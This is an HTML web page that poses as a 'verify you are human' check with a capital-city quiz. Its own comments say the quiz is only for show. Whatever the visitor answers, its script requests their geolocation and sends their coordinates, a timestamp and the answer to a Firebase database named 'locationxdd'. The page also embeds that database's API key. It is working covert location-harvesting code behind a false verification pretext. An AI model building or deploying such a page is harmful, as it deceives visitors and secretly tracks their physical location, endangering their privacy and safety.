<!DOCTYPE html>
<html>
<head>
  <title>Human Verification</title>
  <style>
    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
    button { padding: 10px 20px; font-size: 16px; }
    input { padding: 8px; font-size: 16px; width: 200px; }
  </style>
</head>
<body>

<h2>Verify You Are Human</h2>
<p>Answer the following question:</p>

<div id="quiz">
  <p id="question"></p>
  <input type="text" id="answer" placeholder="Type your answer">
  <br><br>
  <button onclick="submitAnswer()">Submit</button>
</div>

<p id="message"></p>

<!-- Lightweight Firebase -->
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
  authDomain: "locationxdd.firebaseapp.com",
  databaseURL: "https://locationxdd-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "locationxdd",
  storageBucket: "locationxdd.firebasestorage.app",
  messagingSenderId: "114480292043",
  appId: "1:114480292043:web:d143429c68784b0706bb4e"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// Capital quiz questions (random for show)
const quizData = [
  { country: "France", capital: "paris" },
  { country: "Japan", capital: "tokyo" },
  { country: "Australia", capital: "canberra" },
  { country: "Brazil", capital: "brasilia" },
  { country: "Canada", capital: "ottawa" }
];

const currentQuiz = quizData[Math.floor(Math.random() * quizData.length)];
document.getElementById('question').innerText = `What is the capital of ${currentQuiz.country}?`;

// Submit answer (location requested regardless of answer)
function submitAnswer() {
  document.getElementById('quiz').style.display = 'none';
  document.getElementById('message').innerText = "Collecting your location...";
  getLocation();
}

// Get location and send to Firebase
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendPosition, showError);
  } else {
    alert("Geolocation not supported by this browser.");
  }
}

function sendPosition(position) {
  push(ref(db, "locations"), {
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    time: new Date().toString(),
    countryQuestion: currentQuiz.country,
    userAnswer: document.getElementById('answer').value.trim()
  });
  document.getElementById('message').innerText = "Verification complete! Thank you.";
}

function showError(error) {
  alert("Location permission denied or error occurred.");
}

window.submitAnswer = submitAnswer;
</script>

</body>
</html>
